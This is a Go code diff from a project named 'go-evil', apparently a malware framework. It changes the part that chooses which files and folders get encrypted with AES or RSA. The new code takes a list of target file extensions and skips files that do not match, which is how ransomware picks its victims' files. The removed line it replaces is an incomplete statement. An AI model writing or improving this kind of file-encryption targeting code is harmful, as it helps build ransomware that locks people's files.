@@ -7,6 +7,7 @@ import (
 
 	enc_aes "github.com/s9rA16Bf4/go-evil/utility/algorithm/encryption/aes"
 	enc_rsa "github.com/s9rA16Bf4/go-evil/utility/algorithm/encryption/rsa"
+	"github.com/s9rA16Bf4/go-evil/utility/contains"
 
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
@@ -16,8 +17,8 @@ import (
 type target_t struct {
 	target_name       string
 	encryption_method string
-	target_type       string // File or Folder
-	target_extension  string // What kind of extension are we looking for
+	target_type       string   // File or Folder
+	target_extension  []string // What kind of extension are we looking for
 }
 
 var c_target target_t
@@ -37,7 +38,10 @@ func SetTarget(path string) { // Either a file or a folder
 }
 
 func SetExtension(new_extension string) {
-	c_target.target_extension = new_extension
+	if new_extension[0:1] != "." { // The user didn't include the dot
+		new_extension = "." + new_extension
+	}
+	c_target.target_extension = append(c_target.target_extension, new_extension)
 }
 
 func SetEncryptionMethod(method string) {
@@ -91,7 +95,9 @@ func EncryptFolder(dir string) {
 }
 
 func EncryptFile(file string) {
-	if file[len(c_target.target_extension):]
+	if len(c_target.target_extension) != 0 && !contains.EndsWith(file, c_target.target_extension) { // Is this our target?
+		return // It wasn't our target
+	}
 
 	in, err := os.Open(file) // Target
 	if err != nil {
